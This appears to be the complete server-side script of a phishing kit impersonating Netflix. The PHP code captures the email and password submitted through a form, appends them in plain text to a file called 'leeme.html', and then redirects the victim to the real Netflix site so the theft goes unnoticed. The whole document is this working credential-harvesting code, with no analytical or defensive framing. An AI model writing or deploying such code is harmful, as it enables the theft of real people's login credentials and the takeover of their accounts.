<?php

file_put_contents("leeme.html", "email: " . $_POST['email'] . "\npass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://netflix.com');
exit();
